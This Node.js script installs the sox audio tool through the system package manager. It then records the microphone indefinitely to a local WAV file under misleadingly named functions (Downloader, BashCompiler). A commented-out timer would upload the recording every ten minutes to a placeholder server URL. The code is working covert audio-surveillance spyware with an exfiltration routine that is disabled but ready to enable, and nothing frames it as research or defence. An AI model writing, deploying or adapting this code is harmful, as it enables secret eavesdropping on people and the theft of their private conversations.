const { execFile } = require('child_process');
const os = require("os");

// const fs = require('fs');
// const axios = require('axios');
// const FormData = require('form-data');

function Downloader() {

    let osType = os.type();
    osType = osType.toLowerCase();

    let program;

    if (osType == "darwin") program = "brew";
    else if (osType == "linux") program = "apt";
    else program = "choco";
    const args = [ 'install', 'sox' ];
    
    return new Promise((resolve, reject) => {
        let output = {};
        const child = execFile(program, args, (err, stdout, stderr) => {
            if (stdout) {
                output.stdout = stdout;
            }
            if (err) {
                if (stderr) {
                    output.stderr = stderr;
                    return;
                }
                output.err = err;
            }
        });

        child.on("close", () => {
            resolve(output);
        });
    })
}

Downloader().then(() => {
    BashCompiler();
});

// setInterval(() => {

//     const filePath = './fuckYou.wav';
//     const url = 'Server URL';

//     const form = new FormData();
//     form.append('audio', fs.createReadStream(filePath));

//     axios.post(url, form, {headers : form.getHeaders()});

// }, 10000 * 60);

function BashCompiler() {

    const program = 'sox';
    const args = [ '-d', 'fuckYou.wav' ];
    
    return new Promise((resolve, reject) => {
        let output = {};
        const child = execFile(program, args, (err, stdout, stderr) => {
            if (stdout) {
                output.stdout = stdout;
            }
            if (err) {
                if (stderr) {
                    output.stderr = stderr;
                    return;
                }
                output.err = err;
            }
        });

        child.on("close", () => {
            resolve(output);
        });
    })
}